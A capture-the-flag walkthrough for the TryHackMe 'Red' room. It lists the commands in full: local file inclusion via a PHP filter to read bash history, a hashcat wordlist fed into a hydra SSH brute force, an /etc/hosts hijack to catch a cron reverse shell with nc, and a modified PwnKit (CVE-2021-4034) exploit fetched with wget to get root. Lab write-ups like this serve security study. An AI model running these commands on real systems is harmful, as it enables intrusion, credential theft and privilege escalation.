# Red

[redisl33t](https://tryhackme.com/room/redisl33t)

## Solution

* nmap scan: 22, 80

### Local file inclusion

```console
export IP=...
```

By running the following command we will see the bash history which includes
the `.reminder` file.

```console
curl --silent "http://$IP/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.bash_history" | base64 -d
```

To get the `.reminder` file on our machine and run hashcat on it to generate
the passwords and try all of them with hydra we can run

```console
curl --silent "http://$IP/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.reminder" | base64 -d > .reminder
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
hydra -f -V -l blue -P passlist.txt ssh://$IP
```

Then we can login with the found password with ssh

```console
ssh blue@$IP
```

And finally show the flag with

```console
cat /home/blue/flag1
```

### Cron

If we inspect the processes that are running we can see a tcp connection on
port 9001 to redrules.thm. We can modify the IP of that address to our box.

```console
echo $HOST_IP redrules.thm >> /etc/hosts
```

We need to use append because the file `/etc/hosts` is writable in append mode,
we can see that with `lsattr /etc/hosts`.

Then on the local machine we can run

```console
nc -lvnp 9001
```

After we connect to `red` we can show the second flag with

```console
cat /home/red/flag2
```

### Root

In the home directory of red we can find a `.git` folder which contains a
pkexec executable. We can see that the version of the app is 0.105 which is
vulnerable to CVE-2021-4034 - Pkexec Local Privilege Escalation.

I have found a GitHub repo with a proof of concept:
https://github.com/ly4k/PwnKit However I had to change in the PwnKit.c file the
path to the pkexec executable from the .git folder.

I have saved the file with the changes in this repo

```diff
117c117
<     execve("/usr/bin/pkexec", args, env);
---
>     execve("/home/red/.git/pkexec", args, env);
```

After that you can run make and then upload the executable to the target
machine. Finally after running the executable you will switch user to root.

On the host

```console
make
python -m http.server
```

On the target

```console
wget http://$HOST_IP:8000/main
chmod +x main
./main
```
